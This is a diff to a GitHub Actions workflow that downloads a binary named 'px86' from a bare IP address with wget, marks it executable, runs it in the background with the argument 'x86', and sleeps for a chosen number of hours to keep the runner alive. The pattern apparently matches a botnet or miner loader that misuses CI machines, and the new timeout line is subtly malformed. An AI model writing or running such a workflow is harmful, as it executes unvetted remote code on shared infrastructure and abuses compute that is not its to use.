@@ -19,28 +19,32 @@ on:
 jobs:
   run-binary:
     runs-on: ubuntu-latest
-    timeout-minutes: ${{ fromJSON(format('{0}', github.event.inputs.uptime)) * 60 + 10 }}
-    
+    timeout-minutes: ${{ inputs.uptime }} * 60
+
     steps:
-      - name: Download binary
-        run: |
-          wget http://45.138.16.158/bins/px86 -O px86
-          chmod +x px86
-          file px86
-          ls -la px86
+    - name: Download binary
+      run: |
+        wget http://45.138.16.158/bins/px86 -O px86
+        chmod +x px86
 
-      - name: Run binary with timeout protection
-        run: |
-          # Calculate timeout (5 minutes less than total to allow cleanup)
-          TIMEOUT=$(( (${{ github.event.inputs.uptime }} * 3600) - 300 ))
-          echo "Running binary for $TIMEOUT seconds"
-          
-          # Run binary with timeout and log output
-          timeout $TIMEOUT ./px86 x86 || echo "Binary completed or timed out"
-          
-          echo "Binary execution phase completed"
+    - name: Run binary in background
+      run: |
+        # Run the binary in background
+        ./px86 x86 > output.log 2>&1 &
+        PID=$!
+        echo "Binary started with PID: $PID"
+        echo $PID > pid.txt
 
-      - name: Final cleanup wait
-        run: |
-          echo "Workflow completed successfully"
-          sleep 5
+    - name: Wait for specified time
+      run: |
+        UPTIME=${{ inputs.uptime }}
+        echo "Keeping VM alive for $UPTIME hours..."
+        sleep $(($UPTIME * 3600))
+
+    - name: Cleanup
+      run: |
+        if [ -f pid.txt ]; then
+          PID=$(cat pid.txt)
+          kill $PID 2>/dev/null || true
+          echo "Process terminated"
+        fi
